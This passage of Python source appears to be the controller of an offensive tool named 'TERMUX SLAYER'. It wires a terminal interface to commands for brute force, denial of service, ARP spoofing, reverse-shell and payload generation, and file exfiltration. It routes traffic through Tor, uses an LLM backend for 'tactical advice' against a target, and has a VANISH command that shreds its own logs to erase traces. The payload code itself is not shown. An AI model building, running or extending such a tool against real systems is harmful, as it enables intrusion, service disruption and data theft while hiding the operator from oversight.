        self.layout = Layout()
        self.logs = []
        self.target = self.state.state.get("target")
        self.current_cmd = ""
        self.active_tasks = 0
        self.spinner_chars = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
        self.spinner_idx = 0
        self.tor = TorManager(self)
        self.cortex = NeuralCortex(self)
        self.offensive = OffensiveSuite(self, self.tor, self.cortex)
        if hasattr(signal, 'SIGWINCH'): signal.signal(signal.SIGWINCH, lambda s, f: self.render())
        
    def setup_layout(self):
        cols, rows = shutil.get_terminal_size()
        self.layout = Layout()
        self.layout.split(
            Layout(name="status", size=3),
            Layout(name="main", ratio=1),
            Layout(name="footer", size=3),
        )
        # Give neural more ratio if first_cmd_issued is False to show all commands
        n_ratio = 4 if not hasattr(self, 'first_cmd_issued') or not self.first_cmd_issued else 3
        self.layout["main"].split(Layout(name="body", ratio=2), Layout(name="neural", ratio=n_ratio))

    def add_log(self, msg, level="INFO"):
        colors = {"INFO": "blue", "SUCCESS": "green", "WARN": "yellow", "CRITICAL": "red", "AI": "magenta"}
        t = datetime.now().strftime("%H:%M:%S")
        self.logs.append((t, level, colors.get(level, 'white'), msg))

    def get_header(self):
        cols, rows = shutil.get_terminal_size()
        if rows < 25: return Panel(Align.center("[bold magenta]TERMUX SLAYER v1.0[/]"), style="blue", box=None)
        f = Figlet(font='slant')
        banner = f.renderText('TERMUX') + "\n" + f.renderText('SLAYER')
        return Panel(Align.center(f"[bold magenta]{banner}[/]"), style="blue")

    def get_status(self):
        spin = f"[bold yellow]{self.spinner_chars[self.spinner_idx]}[/] " if self.active_tasks > 0 else ""
        stat = f"{spin}[bold cyan]CTX:[/] {self.cortex.status} | [bold cyan]TARGET:[/] {self.target if self.target else 'NONE'} | [bold cyan]TOR:[/] [{'green' if self.tor.active else 'red'}]{'ON' if self.tor.active else 'OFF'}[/]"
        return Panel(Align.center(stat), border_style="cyan")

    def get_neural(self):
        text = Text()
        if not hasattr(self, 'first_cmd_issued'): self.first_cmd_issued = False
        
        if not self.first_cmd_issued:
            for cmd, desc in SlayerConfig.COMMAND_LIST.items():
                text.append(f"• {cmd}", style="bold white")
                text.append(f" : {desc}\n", style="white")
        else:
            if self.cortex.history:
                q, a = self.cortex.history[-1]
                text.append(f"TACTICAL ADVICE:\n", style="bold magenta")
                text.append(f"{a}\n", style="magenta")
            else:
                text.append("Awaiting tactical input...\n", style="italic white")
            
            if self.cortex.buffer:
                text.append(f"\n[INTELLIGENCE BUFFERED: {len(self.cortex.buffer)} EVENTS]", style="bold yellow")
                text.append("\nUse 'CONSULT' to analyze.", style="yellow")
                
        return Panel(text, title="Neural Link (Live Feedback)", border_style="magenta")

    def get_body(self):
        cols, rows = shutil.get_terminal_size()
        limit = 5 if rows < 25 else 10
        text = Text()
        for t, lvl, clr, msg in self.logs[-limit:]:
            text.append(f"[{t}] ", style="white")
            text.append(f"[{lvl}] ", style=f"bold {clr}")
            text.append(f"{msg}\n", style="white")
        return Panel(text, title="Output", border_style="green")

    def render(self):
        if self.active_tasks > 0:
            self.spinner_idx = (self.spinner_idx + 1) % len(self.spinner_chars)
        
        cols, rows = shutil.get_terminal_size()
        ui_height = rows - 1
        sys.stdout.write("\033[?25l") # Hide cursor
        sys.stdout.write("\033[H") # Move cursor to top
        self.setup_layout()
        self.layout["status"].update(self.get_status())
        self.layout["body"].update(self.get_body())
        self.layout["neural"].update(self.get_neural())
        self.layout["footer"].update(Panel(f"[bold green]Slayer-Input > [/][bold white]{self.current_cmd}[/]", border_style="blue"))
        console.print(self.layout, height=ui_height)
        sys.stdout.write("\033[K") # Clear to end of line
        sys.stdout.write("\033[?25h") # Show cursor
        sys.stdout.flush()

    def process_command(self, cmd_input):
        if not cmd_input: return
        # Clear windows after first command
        if not hasattr(self, 'first_cmd_issued'): self.first_cmd_issued = False
        if not self.first_cmd_issued:
            self.logs = []
            self.first_cmd_issued = True

        parts = cmd_input.split()
        cmd = parts[0].upper()
        args = parts[1:]
        
        if cmd == "EXIT": sys.exit(0)
        elif cmd == "HELP":
            self.first_cmd_issued = False
            self.cortex.history = []
            self.add_log("Tactical Manual Displayed.", "SUCCESS")
        elif cmd == "API":
            if len(args) >= 1:
                key_input = args[0].strip()
                # Auto-detection for API providers
                if key_input.startswith("gsk_"):
                    SlayerConfig.PRIMARY_KEY = key_input
                    SlayerConfig.PRIMARY_MODEL = "mixtral-8x7b-32768"
                    SlayerConfig.API_ENDPOINT = "https://api.groq.com/openai/v1/chat/completions"
                    self.add_log("Groq Neural Core Linked.", "SUCCESS")
                elif key_input.startswith("sk-"):
                    SlayerConfig.PRIMARY_KEY = key_input
                    SlayerConfig.PRIMARY_MODEL = "gpt-4-turbo"
                    SlayerConfig.API_ENDPOINT = "https://api.openai.com/v1/chat/completions"
                    self.add_log("OpenAI Neural Core Linked.", "SUCCESS")
                else:
                    # Default to Mistral for other keys
                    SlayerConfig.PRIMARY_KEY = key_input
                    SlayerConfig.PRIMARY_MODEL = "mistral-small-latest"
                    SlayerConfig.API_ENDPOINT = "https://api.mistral.ai/v1/chat/completions"
                    self.add_log("Mistral Neural Core Linked.", "SUCCESS")
                
                self.cortex.load()
            else:
                # Check environment variables first
                env_key = os.environ.get("GROQ_API_KEY") or os.environ.get("MISTRAL_API_KEY") or ""
                if env_key:
                    SlayerConfig.PRIMARY_KEY = env_key
                    if env_key.startswith("gsk_"):
                        SlayerConfig.PRIMARY_MODEL = "mixtral-8x7b-32768"
                        SlayerConfig.API_ENDPOINT = "https://api.groq.com/openai/v1/chat/completions"
                    else:
                        SlayerConfig.PRIMARY_MODEL = "mistral-small-latest"
                        SlayerConfig.API_ENDPOINT = "https://api.mistral.ai/v1/chat/completions"
                    self.cortex.load()
                    self.add_log("Neural Core Ignited from Environment Variable.", "SUCCESS")
                else:
                    self.add_log("No API key found. Use 'API <key>' or set GROQ_API_KEY env var.", "WARN")
        elif cmd == "SCAN":
            if not args: self.add_log("SCAN requires target (e.g., SCAN 192.168.1.1)", "WARN")
            else:
                self.target = args[0]
                self.state.update("target", self.target)
                threading.Thread(target=self.offensive.scan, args=(self.target,), daemon=True).start()
        elif cmd == "BRUTE":
            if not args: self.add_log("BRUTE requires target (e.g., BRUTE 192.168.1.1 ssh)", "WARN")
            else:
                t = args[0]
                s = args[1] if len(args)>1 else "ssh"
                threading.Thread(target=self.offensive.brute, args=(t, s), daemon=True).start()
        elif cmd == "FUZZ":
            if not args: self.add_log("FUZZ requires URL (e.g., FUZZ http://example.com)", "WARN")
            else:
                t = args[0]
                threading.Thread(target=self.offensive.fuzz, args=(t,), daemon=True).start()
        elif cmd == "AUTO":
            if not args: self.add_log("AUTO requires target", "WARN")
            else:
                t = args[0]
                threading.Thread(target=self.offensive.auto, args=(t,), daemon=True).start()
        elif cmd == "RECON":
            if not args: self.add_log("RECON requires domain", "WARN")
            else:
                t = args[0]
                threading.Thread(target=self.offensive.recon, args=(t,), daemon=True).start()
        elif cmd == "SNIFF":
            threading.Thread(target=self.offensive.sniff, daemon=True).start()
        elif cmd == "GEO":
            if not args: self.add_log("GEO requires IP", "WARN")
            else:
                t = args[0]
                threading.Thread(target=self.offensive.geo, args=(t,), daemon=True).start()
        elif cmd == "DOS":
            if len(args) < 2: self.add_log("DOS requires target and port", "WARN")
            else:
                t = args[0]
                p = args[1]
                threading.Thread(target=self.offensive.dos, args=(t, p), daemon=True).start()
        elif cmd == "WEB":
            if not args: self.add_log("WEB requires URL", "WARN")
            else:
                t = args[0]
                threading.Thread(target=self.offensive.web_scan, args=(t,), daemon=True).start()
        elif cmd == "HASH":
            if not args: self.add_log("HASH requires string", "WARN")
            else: self.offensive.hash_id(args[0])
        elif cmd == "SHELL":
            if len(args) < 2: self.add_log("SHELL requires LHOST and LPORT", "WARN")
            else: self.offensive.gen_shell(args[0], args[1])
        elif cmd == "EXFIL":
            if len(args) < 2: self.add_log("EXFIL requires target and file", "WARN")
            else: self.offensive.exfil(args[0], args[1])
        elif cmd == "LISTEN":
            if not args: self.add_log("LISTEN requires port", "WARN")
            else: threading.Thread(target=self.offensive.listen, args=(args[0],), daemon=True).start()
        elif cmd == "OSINT":
            if not args: self.add_log("OSINT requires target", "WARN")
            else: threading.Thread(target=self.offensive.osint, args=(args[0],), daemon=True).start()
        elif cmd == "PAYLOAD":
            if len(args) < 3: self.add_log("PAYLOAD requires type, lhost, lport", "WARN")
            else: self.offensive.payload(args[0], args[1], args[2])
        elif cmd == "CLOUD":
            if not args: self.add_log("CLOUD requires target", "WARN")
            else: threading.Thread(target=self.offensive.cloud, args=(args[0],), daemon=True).start()
        elif cmd == "SPOOF":
            if len(args) < 2: self.add_log("SPOOF requires target and gateway", "WARN")
            else: threading.Thread(target=self.offensive.spoof, args=(args[0], args[1]), daemon=True).start()
        elif cmd == "TOR": self.tor.toggle(args[0].upper() if args else None)
        elif cmd == "AI":
            if not args: self.add_log("AI requires a demand", "WARN")
            else:
                q = " ".join(args)
                self.add_log(f"Processing Demand: {q}", "AI")
                threading.Thread(target=lambda: self.cortex.reason(q, {"target": self.target}), daemon=True).start()
        elif cmd == "VANISH":
            targets = [
                SlayerConfig.LOG_FILE,
                SlayerConfig.STATE_FILE,
                os.path.join(SlayerConfig.BASE_DIR, "slayer_state.json"),
                os.path.join(SlayerConfig.BASE_DIR, "slayer_ops.log"),
            ]
            for f in targets:
                if os.path.exists(f): os.system(f"shred -u '{f}' 2>/dev/null; rm -f '{f}'")
            # Clean Python cache files
            pycache = os.path.join(SlayerConfig.BASE_DIR, "__pycache__")
            if os.path.exists(pycache): os.system(f"rm -rf '{pycache}'")
            for root, dirs, files in os.walk(SlayerConfig.BASE_DIR):
                for f in files:
                    if f.endswith(".pyc"):
                        os.remove(os.path.join(root, f))
            self.add_log("All operational traces purged.", "SUCCESS")
        elif cmd == "CONSULT":
            self.add_log("Initiating Batch Intelligence Analysis...", "AI")
            threading.Thread(target=self.cortex.consult, args=(self.target,), daemon=True).start()
        else: self.add_log(f"Unknown: {cmd}", "WARN")

    def show_disclaimer(self):
        disclaimer = [
            "!!! TACTICAL WARNING !!!",
            "This tool is for educational and authorized",
            "security testing only. Unauthorized access",
            "is illegal. Use at your own risk.",
            "",
            "⚡️👾 by PhonkAlphabet 👾⚡️"
        ]
        
        cols, rows = shutil.get_terminal_size()
        center_row = rows // 2 - len(disclaimer) // 2
        chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()"
        
        # Clear screen
        sys.stdout.write("\033[H\033[2J\033[3J")
        sys.stdout.flush()
        
        # Neural Decryption Effect
        for i, line in enumerate(disclaimer):
            target_row = center_row + i
            target_col = (cols - len(line)) // 2
            
            # Reveal character by character with scrambling
            current_display = ""
            for char_idx, target_char in enumerate(line):
                if target_char == " ":
                    current_display += " "
                    continue
                
                # Scramble effect before reveal
                for _ in range(3):
                    scramble_char = random.choice(chars)
                    sys.stdout.write(f"\033[{target_row+1};{target_col+1}H{current_display}{Fore.YELLOW}{scramble_char}{Style.RESET_ALL}")
                    sys.stdout.flush()
                    time.sleep(0.01)
                
                current_display += target_char
                color = Fore.RED if i < 4 else Fore.MAGENTA
                sys.stdout.write(f"\033[{target_row+1};{target_col+1}H{color}{current_display}{Style.RESET_ALL}")
                sys.stdout.flush()
            
        time.sleep(2.5)
        # Clear for app start
        sys.stdout.write("\033[H\033[2J\033[3J")
        sys.stdout.flush()

    def run(self):
        self.show_disclaimer()
        self.tor.get_ip()
        self.cortex.load()
        self.add_log("--- TACTICAL IGNITION SEQUENCE ---", "INFO")
        self.add_log("ESC Key : Global Kill-Switch (Terminate All)", "CRITICAL")
        # Commands are already displayed in the Neural Link panel via get_neural()
        # when first_cmd_issued is False. No need to double-log them here.
        self.add_log("Neural Link Active. Awaiting tactical commands...", "SUCCESS")
        
        def animate():
            while True:
                if self.active_tasks > 0:
                    self.spinner_idx = (self.spinner_idx + 1) % len(self.spinner_chars)
                    self.render()
                time.sleep(0.1)
        threading.Thread(target=animate, daemon=True).start()

        # Clear screen once at start
        sys.stdout.write("\033[H\033[2J\033[3J")
        sys.stdout.flush()

        # Use a more robust input loop that prevents shell leakage
        fd = sys.stdin.fileno()
        old_settings = termios.tcgetattr(fd)
        try:
            tty.setcbreak(fd) # Use cbreak instead of raw for better stability
            sys.stdout.write("\033[?25l") # Hide cursor initially
            sys.stdout.flush()
            while True:
                self.render()
                rlist, _, _ = select.select([sys.stdin], [], [], 0.05)
                if rlist:
                    char = sys.stdin.read(1)
                    if ord(char) == 27: # ESC key
                        rlist_esc, _, _ = select.select([sys.stdin], [], [], 0.05)
                        if not rlist_esc:
                            self.offensive.stop_all()
                            self.add_log("GLOBAL KILL-SWITCH TRIGGERED", "CRITICAL")
                            self.current_cmd = ""
                        else:
                            sys.stdin.read(2)
                    elif char in ['\r', '\n']:
                        cmd = self.current_cmd.strip()
                        self.current_cmd = ""
                        if cmd.upper() == "EXIT":
                            break
                        self.process_command(cmd)
                    elif ord(char) in [127, 8]: # Backspace
                        self.current_cmd = self.current_cmd[:-1]
                    elif ord(char) >= 32: # Printable characters
                        self.current_cmd += char
        except KeyboardInterrupt:
            pass
        except Exception as e:
            termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
            sys.stdout.write("\033[?25h") # Ensure cursor is back
            sys.stdout.flush()
            while True:
                try:
                    cmd = input("Slayer-Input > ").strip()
                    if cmd.upper() == "EXIT": break
                    self.process_command(cmd)
                except (KeyboardInterrupt, EOFError): break
        finally:
            termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
            sys.stdout.write("\033[?25h") # Show cursor
            sys.stdout.write("\033[H\033[2J\033[3J")
            sys.stdout.flush()

if __name__ == "__main__":
    try:
        omega = TermuxSlayerApp()
        omega.run()
    except KeyboardInterrupt: sys.exit(0)
